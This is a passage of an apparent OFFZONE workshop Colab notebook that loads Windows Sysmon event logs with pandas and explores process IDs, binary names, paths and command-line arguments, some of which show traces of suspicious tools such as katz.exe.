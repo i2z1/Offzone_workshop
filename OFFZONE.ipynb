{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "gpuType": "T4",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/i2z1/Offzone_workshop/blob/main/OFFZONE.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Загружаем данные для воркшопа**"
      ],
      "metadata": {
        "id": "EizmqQg9Pc9-"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!wget https://raw.githubusercontent.com/SadrikA78/offzone/main/data/dataset.csv"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "0cRf-sCt4lIb",
        "outputId": "90281e53-eca1-4dab-b64b-042b352f345b"
      },
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--2023-08-24 14:50:55--  https://raw.githubusercontent.com/SadrikA78/offzone/main/data/dataset.csv\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 568968 (556K) [text/plain]\n",
            "Saving to: ‘dataset.csv’\n",
            "\n",
            "dataset.csv         100%[===================>] 555.63K  --.-KB/s    in 0.01s   \n",
            "\n",
            "2023-08-24 14:50:55 (37.4 MB/s) - ‘dataset.csv’ saved [568968/568968]\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Прочитаем данные (CSV-DataFrame)**"
      ],
      "metadata": {
        "id": "KYdW-yCIVDNM"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import pandas as pd\n",
        "df = pd.read_csv('/content/dataset.csv')"
      ],
      "metadata": {
        "id": "H7zMqEtxPv4A"
      },
      "execution_count": 4,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Проверим корректность**"
      ],
      "metadata": {
        "id": "0ahGUE4vZ8nv"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "df"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 679
        },
        "id": "jVr9UOd4WCdW",
        "outputId": "07f722c1-2246-467d-df27-c9458572a43e"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "      Unnamed: 0                  UtcTime  ProcessId  EventID  \\\n",
              "0              0  2020-05-12 15:05:19.447       5380        7   \n",
              "1              1  2020-05-12 15:05:19.493       5380       11   \n",
              "2              2  2020-05-12 15:05:19.337       5080       11   \n",
              "3              3  2020-05-12 15:05:17.066       1520        3   \n",
              "4              4  2020-05-12 15:05:13.770          4        3   \n",
              "...          ...                      ...        ...      ...   \n",
              "3707        3767  2020-05-12 14:53:16.220       7544        7   \n",
              "3708        3768  2020-05-12 14:53:16.201       5264        1   \n",
              "3709        3769  2020-05-12 14:53:16.141       7544        7   \n",
              "3710        3770  2020-05-12 14:53:16.126       7544        7   \n",
              "3711        3771  2020-05-12 14:53:16.017       5380        7   \n",
              "\n",
              "                      User                                              Image  \\\n",
              "0                      NaN                            C:\\Windows\\explorer.exe   \n",
              "1                      NaN                            C:\\Windows\\Explorer.EXE   \n",
              "2                      NaN                        C:\\Windows\\system32\\mmc.exe   \n",
              "3     DESKTOP-TATBGQH\\anon  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...   \n",
              "4      NT AUTHORITY\\SYSTEM                                             System   \n",
              "...                    ...                                                ...   \n",
              "3707                   NaN              C:\\Windows\\System32\\RuntimeBroker.exe   \n",
              "3708   NT AUTHORITY\\SYSTEM                    C:\\Windows\\System32\\svchost.exe   \n",
              "3709                   NaN              C:\\Windows\\System32\\RuntimeBroker.exe   \n",
              "3710                   NaN              C:\\Windows\\System32\\RuntimeBroker.exe   \n",
              "3711                   NaN                            C:\\Windows\\explorer.exe   \n",
              "\n",
              "                                            ImageLoaded  \\\n",
              "0       C:\\Windows\\System32\\Windows.System.Launcher.dll   \n",
              "1                                                   NaN   \n",
              "2                                                   NaN   \n",
              "3                                                   NaN   \n",
              "4                                                   NaN   \n",
              "...                                                 ...   \n",
              "3707                    C:\\Windows\\System32\\mssprxy.dll   \n",
              "3708                                                NaN   \n",
              "3709  C:\\Windows\\System32\\Windows.StateRepositoryPS.dll   \n",
              "3710  C:\\Windows\\System32\\OneCoreUAPCommonProxyStub.dll   \n",
              "3711             C:\\Windows\\System32\\execmodelproxy.dll   \n",
              "\n",
              "                                            CommandLine  \\\n",
              "0                                                   NaN   \n",
              "1                                                   NaN   \n",
              "2                                                   NaN   \n",
              "3                                                   NaN   \n",
              "4                                                   NaN   \n",
              "...                                                 ...   \n",
              "3707                                                NaN   \n",
              "3708  C:\\Windows\\system32\\svchost.exe -k wsappx -p -...   \n",
              "3709                                                NaN   \n",
              "3710                                                NaN   \n",
              "3711                                                NaN   \n",
              "\n",
              "                           ParentImage                 ParentCommandLine  \\\n",
              "0                                  NaN                               NaN   \n",
              "1                                  NaN                               NaN   \n",
              "2                                  NaN                               NaN   \n",
              "3                                  NaN                               NaN   \n",
              "4                                  NaN                               NaN   \n",
              "...                                ...                               ...   \n",
              "3707                               NaN                               NaN   \n",
              "3708  C:\\Windows\\System32\\services.exe  C:\\Windows\\system32\\services.exe   \n",
              "3709                               NaN                               NaN   \n",
              "3710                               NaN                               NaN   \n",
              "3711                               NaN                               NaN   \n",
              "\n",
              "      DestinationPort Protocol QueryName  \\\n",
              "0                 NaN      NaN       NaN   \n",
              "1                 NaN      NaN       NaN   \n",
              "2                 NaN      NaN       NaN   \n",
              "3              8080.0      tcp       NaN   \n",
              "4               137.0      udp       NaN   \n",
              "...               ...      ...       ...   \n",
              "3707              NaN      NaN       NaN   \n",
              "3708              NaN      NaN       NaN   \n",
              "3709              NaN      NaN       NaN   \n",
              "3710              NaN      NaN       NaN   \n",
              "3711              NaN      NaN       NaN   \n",
              "\n",
              "                                         TargetFilename TargetObject  \n",
              "0                                                   NaN          NaN  \n",
              "1     C:\\Users\\anon\\AppData\\Roaming\\Microsoft\\Window...          NaN  \n",
              "2                  C:\\Users\\anon\\Desktop\\xmlEvents2.xml          NaN  \n",
              "3                                                   NaN          NaN  \n",
              "4                                                   NaN          NaN  \n",
              "...                                                 ...          ...  \n",
              "3707                                                NaN          NaN  \n",
              "3708                                                NaN          NaN  \n",
              "3709                                                NaN          NaN  \n",
              "3710                                                NaN          NaN  \n",
              "3711                                                NaN          NaN  \n",
              "\n",
              "[3712 rows x 15 columns]"
            ],
            "text/html": [
              "\n",
              "\n",
              "  <div id=\"df-7169d8c5-a092-441a-83f6-15075a760aa5\">\n",
              "    <div class=\"colab-df-container\">\n",
              "      <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>Unnamed: 0</th>\n",
              "      <th>UtcTime</th>\n",
              "      <th>ProcessId</th>\n",
              "      <th>EventID</th>\n",
              "      <th>User</th>\n",
              "      <th>Image</th>\n",
              "      <th>ImageLoaded</th>\n",
              "      <th>CommandLine</th>\n",
              "      <th>ParentImage</th>\n",
              "      <th>ParentCommandLine</th>\n",
              "      <th>DestinationPort</th>\n",
              "      <th>Protocol</th>\n",
              "      <th>QueryName</th>\n",
              "      <th>TargetFilename</th>\n",
              "      <th>TargetObject</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>0</td>\n",
              "      <td>2020-05-12 15:05:19.447</td>\n",
              "      <td>5380</td>\n",
              "      <td>7</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\explorer.exe</td>\n",
              "      <td>C:\\Windows\\System32\\Windows.System.Launcher.dll</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>1</td>\n",
              "      <td>2020-05-12 15:05:19.493</td>\n",
              "      <td>5380</td>\n",
              "      <td>11</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\Explorer.EXE</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Users\\anon\\AppData\\Roaming\\Microsoft\\Window...</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>2</td>\n",
              "      <td>2020-05-12 15:05:19.337</td>\n",
              "      <td>5080</td>\n",
              "      <td>11</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\system32\\mmc.exe</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Users\\anon\\Desktop\\xmlEvents2.xml</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>3</td>\n",
              "      <td>2020-05-12 15:05:17.066</td>\n",
              "      <td>1520</td>\n",
              "      <td>3</td>\n",
              "      <td>DESKTOP-TATBGQH\\anon</td>\n",
              "      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>8080.0</td>\n",
              "      <td>tcp</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>4</td>\n",
              "      <td>2020-05-12 15:05:13.770</td>\n",
              "      <td>4</td>\n",
              "      <td>3</td>\n",
              "      <td>NT AUTHORITY\\SYSTEM</td>\n",
              "      <td>System</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>137.0</td>\n",
              "      <td>udp</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>...</th>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "      <td>...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3707</th>\n",
              "      <td>3767</td>\n",
              "      <td>2020-05-12 14:53:16.220</td>\n",
              "      <td>7544</td>\n",
              "      <td>7</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\System32\\RuntimeBroker.exe</td>\n",
              "      <td>C:\\Windows\\System32\\mssprxy.dll</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3708</th>\n",
              "      <td>3768</td>\n",
              "      <td>2020-05-12 14:53:16.201</td>\n",
              "      <td>5264</td>\n",
              "      <td>1</td>\n",
              "      <td>NT AUTHORITY\\SYSTEM</td>\n",
              "      <td>C:\\Windows\\System32\\svchost.exe</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\system32\\svchost.exe -k wsappx -p -...</td>\n",
              "      <td>C:\\Windows\\System32\\services.exe</td>\n",
              "      <td>C:\\Windows\\system32\\services.exe</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3709</th>\n",
              "      <td>3769</td>\n",
              "      <td>2020-05-12 14:53:16.141</td>\n",
              "      <td>7544</td>\n",
              "      <td>7</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\System32\\RuntimeBroker.exe</td>\n",
              "      <td>C:\\Windows\\System32\\Windows.StateRepositoryPS.dll</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3710</th>\n",
              "      <td>3770</td>\n",
              "      <td>2020-05-12 14:53:16.126</td>\n",
              "      <td>7544</td>\n",
              "      <td>7</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\System32\\RuntimeBroker.exe</td>\n",
              "      <td>C:\\Windows\\System32\\OneCoreUAPCommonProxyStub.dll</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3711</th>\n",
              "      <td>3771</td>\n",
              "      <td>2020-05-12 14:53:16.017</td>\n",
              "      <td>5380</td>\n",
              "      <td>7</td>\n",
              "      <td>NaN</td>\n",
              "      <td>C:\\Windows\\explorer.exe</td>\n",
              "      <td>C:\\Windows\\System32\\execmodelproxy.dll</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "      <td>NaN</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "<p>3712 rows × 15 columns</p>\n",
              "</div>\n",
              "      <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-7169d8c5-a092-441a-83f6-15075a760aa5')\"\n",
              "              title=\"Convert this dataframe to an interactive table.\"\n",
              "              style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "       width=\"24px\">\n",
              "    <path d=\"M0 0h24v24H0V0z\" fill=\"none\"/>\n",
              "    <path d=\"M18.56 5.44l.94 2.06.94-2.06 2.06-.94-2.06-.94-.94-2.06-.94 2.06-2.06.94zm-11 1L8.5 8.5l.94-2.06 2.06-.94-2.06-.94L8.5 2.5l-.94 2.06-2.06.94zm10 10l.94 2.06.94-2.06 2.06-.94-2.06-.94-.94-2.06-.94 2.06-2.06.94z\"/><path d=\"M17.41 7.96l-1.37-1.37c-.4-.4-.92-.59-1.43-.59-.52 0-1.04.2-1.43.59L10.3 9.45l-7.72 7.72c-.78.78-.78 2.05 0 2.83L4 21.41c.39.39.9.59 1.41.59.51 0 1.02-.2 1.41-.59l7.78-7.78 2.81-2.81c.8-.78.8-2.07 0-2.86zM5.41 20L4 18.59l7.72-7.72 1.47 1.35L5.41 20z\"/>\n",
              "  </svg>\n",
              "      </button>\n",
              "\n",
              "\n",
              "\n",
              "    <div id=\"df-cce2d996-1f50-4889-8e87-162bd85cd839\">\n",
              "      <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-cce2d996-1f50-4889-8e87-162bd85cd839')\"\n",
              "              title=\"Suggest charts.\"\n",
              "              style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "      </button>\n",
              "    </div>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "    background-color: #E8F0FE;\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: #1967D2;\n",
              "    height: 32px;\n",
              "    padding: 0 0 0 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: #E2EBFA;\n",
              "    box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: #174EA6;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "    background-color: #3B4455;\n",
              "    fill: #D2E3FC;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart:hover {\n",
              "    background-color: #434B5C;\n",
              "    box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "    filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "    fill: #FFFFFF;\n",
              "  }\n",
              "</style>\n",
              "\n",
              "    <script>\n",
              "      async function quickchart(key) {\n",
              "        const containerElement = document.querySelector('#' + key);\n",
              "        const charts = await google.colab.kernel.invokeFunction(\n",
              "            'suggestCharts', [key], {});\n",
              "      }\n",
              "    </script>\n",
              "\n",
              "      <script>\n",
              "\n",
              "function displayQuickchartButton(domScope) {\n",
              "  let quickchartButtonEl =\n",
              "    domScope.querySelector('#df-cce2d996-1f50-4889-8e87-162bd85cd839 button.colab-df-quickchart');\n",
              "  quickchartButtonEl.style.display =\n",
              "    google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "}\n",
              "\n",
              "        displayQuickchartButton(document);\n",
              "      </script>\n",
              "      <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      flex-wrap:wrap;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "      <script>\n",
              "        const buttonEl =\n",
              "          document.querySelector('#df-7169d8c5-a092-441a-83f6-15075a760aa5 button.colab-df-convert');\n",
              "        buttonEl.style.display =\n",
              "          google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "        async function convertToInteractive(key) {\n",
              "          const element = document.querySelector('#df-7169d8c5-a092-441a-83f6-15075a760aa5');\n",
              "          const dataTable =\n",
              "            await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                     [key], {});\n",
              "          if (!dataTable) return;\n",
              "\n",
              "          const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "            '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "            + ' to learn more about interactive tables.';\n",
              "          element.innerHTML = '';\n",
              "          dataTable['output_type'] = 'display_data';\n",
              "          await google.colab.output.renderOutput(dataTable, element);\n",
              "          const docLink = document.createElement('div');\n",
              "          docLink.innerHTML = docLinkHtml;\n",
              "          element.appendChild(docLink);\n",
              "        }\n",
              "      </script>\n",
              "    </div>\n",
              "  </div>\n"
            ]
          },
          "metadata": {},
          "execution_count": 11
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Предварительный просмотр**"
      ],
      "metadata": {
        "id": "Jkdsx_LLaCEG"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "df.info()"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "LC5e-AohYirp",
        "outputId": "57e951f2-b59b-4b74-dbc8-de23498eccd9"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "<class 'pandas.core.frame.DataFrame'>\n",
            "RangeIndex: 3712 entries, 0 to 3711\n",
            "Data columns (total 15 columns):\n",
            " #   Column             Non-Null Count  Dtype  \n",
            "---  ------             --------------  -----  \n",
            " 0   Unnamed: 0         3712 non-null   int64  \n",
            " 1   UtcTime            3712 non-null   object \n",
            " 2   ProcessId          3712 non-null   int64  \n",
            " 3   EventID            3712 non-null   int64  \n",
            " 4   User               331 non-null    object \n",
            " 5   Image              3712 non-null   object \n",
            " 6   ImageLoaded        3110 non-null   object \n",
            " 7   CommandLine        60 non-null     object \n",
            " 8   ParentImage        60 non-null     object \n",
            " 9   ParentCommandLine  60 non-null     object \n",
            " 10  DestinationPort    271 non-null    float64\n",
            " 11  Protocol           271 non-null    object \n",
            " 12  QueryName          104 non-null    object \n",
            " 13  TargetFilename     157 non-null    object \n",
            " 14  TargetObject       10 non-null     object \n",
            "dtypes: float64(1), int64(3), object(11)\n",
            "memory usage: 435.1+ KB\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "len(df.ProcessId.value_counts().index)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "aGAjVrb2ald-",
        "outputId": "7a48f528-119b-46a3-a3ac-79a1f32b1c27"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "93"
            ]
          },
          "metadata": {},
          "execution_count": 56
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "len(df.ProcessId.value_counts()[df.ProcessId.value_counts() > 5].index)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "0F7CH3U2avgz",
        "outputId": "eb660099-1425-40b6-c9cb-e21e3c29ffca"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "79"
            ]
          },
          "metadata": {},
          "execution_count": 57
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "df.ProcessId.value_counts()[0:10]"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "M7B7Shkba8TC",
        "outputId": "a6838a3c-dcd6-4963-900f-b047ca9dfde7"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "1520     284\n",
              "9716     168\n",
              "9116     163\n",
              "3748     114\n",
              "10116    110\n",
              "9308     107\n",
              "4556      97\n",
              "1532      90\n",
              "4752      90\n",
              "7584      89\n",
              "Name: ProcessId, dtype: int64"
            ]
          },
          "metadata": {},
          "execution_count": 58
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Предобработка**"
      ],
      "metadata": {
        "id": "IFChX-xFcejO"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "newdf = df[~df.ProcessId.isna()]\n",
        "newdf.drop(newdf[newdf.EventID == '5'].index, inplace=True)"
      ],
      "metadata": {
        "id": "ZslUJWfVceGg"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "1. Исходники и пути"
      ],
      "metadata": {
        "id": "Nqas7KcEdjyi"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "newdf['binary'] = newdf.Image.str.split(r'\\\\').apply(lambda x: x[-1].lower())\n",
        "newdf['binary'].unique()"
      ],
      "metadata": {
        "id": "B03p98VkbHWU",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "394cb401-1312-463a-abcc-f864cf60ea40"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array(['explorer.exe', 'mmc.exe', 'powershell.exe', 'system',\n",
              "       'sysmon.exe', 'fsatps.exe', 'searchui.exe',\n",
              "       'startmenuexperiencehost.exe', 'svchost.exe', 'fsatpn.exe',\n",
              "       'fshoster32.exe', 'calculator.exe', 'backgroundtaskhost.exe',\n",
              "       'fsorsp64.exe', 'runtimebroker.exe', 'dllhost.exe',\n",
              "       'applicationframehost.exe', 'notepad.exe', 'wmiprvse.exe',\n",
              "       'netstat.exe', 'tiworker.exe', 'trustedinstaller.exe',\n",
              "       'services.exe', 'conhost.exe', 'wmiapsrv.exe', 'taskhostw.exe',\n",
              "       'wsqmcons.exe', 'microsoftedge.exe', 'localbridge.exe',\n",
              "       'microsoftedgecp.exe', 'microsoftedgesh.exe', 'browser_broker.exe',\n",
              "       'katz.exe', 'schtasks.exe', 'fshoster64.exe', 'fodhelper.exe',\n",
              "       'consent.exe', 'whoami.exe', 'systeminfo.exe', 'smartscreen.exe',\n",
              "       'wscript.exe', 'searchfilterhost.exe'], dtype=object)"
            ]
          },
          "metadata": {},
          "execution_count": 60
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "newdf['path'] = newdf.Image.str.split(r'\\\\').apply(lambda x: '\\\\'.join(x[:-1]).lower())\n",
        "newdf['path'].unique()"
      ],
      "metadata": {
        "id": "Qg60wJdVdo7Q",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "43d9c9c8-bc12-4bbc-be3c-9dbade120197"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array(['c:\\\\windows', 'c:\\\\windows\\\\system32',\n",
              "       'c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0', '',\n",
              "       'c:\\\\program files (x86)\\\\f-secure\\\\psb\\\\ultralight\\\\sensor\\\\1585128330',\n",
              "       'c:\\\\windows\\\\systemapps\\\\microsoft.windows.cortana_cw5n1h2txyewy',\n",
              "       'c:\\\\windows\\\\systemapps\\\\microsoft.windows.startmenuexperiencehost_cw5n1h2txyewy',\n",
              "       'c:\\\\program files (x86)\\\\f-secure\\\\psb',\n",
              "       'c:\\\\program files\\\\windowsapps\\\\microsoft.windowscalculator_10.1910.0.0_x64__8wekyb3d8bbwe',\n",
              "       'c:\\\\program files (x86)\\\\f-secure\\\\psb\\\\ultralight\\\\ulcore\\\\1585820217',\n",
              "       'c:\\\\windows\\\\system32\\\\wbem',\n",
              "       'c:\\\\windows\\\\winsxs\\\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.772_none_5f13f94c58ff41d3',\n",
              "       'c:\\\\windows\\\\servicing',\n",
              "       'c:\\\\windows\\\\systemapps\\\\microsoft.microsoftedge_8wekyb3d8bbwe',\n",
              "       'c:\\\\program files\\\\windowsapps\\\\microsoft.microsoftofficehub_18.2002.1101.0_x64__8wekyb3d8bbwe',\n",
              "       'c:\\\\windows\\\\system32\\\\katz'], dtype=object)"
            ]
          },
          "metadata": {},
          "execution_count": 61
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "2. Аргументы cmd\n"
      ],
      "metadata": {
        "id": "BjMhUMv_eYt3"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "newdf['arguments'] = newdf.CommandLine.fillna('empty').str.split().apply(lambda x: ' '.join(x[1:]))\n",
        "newdf['arguments'].unique()"
      ],
      "metadata": {
        "id": "MvdtgZlweaU7",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "b9e68984-38eb-4bdf-ac90-de6f3ac73642"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "array(['', '-k wsappx -p -s AppXSvc',\n",
              "       '-ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca',\n",
              "       '-Embedding', '/Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}',\n",
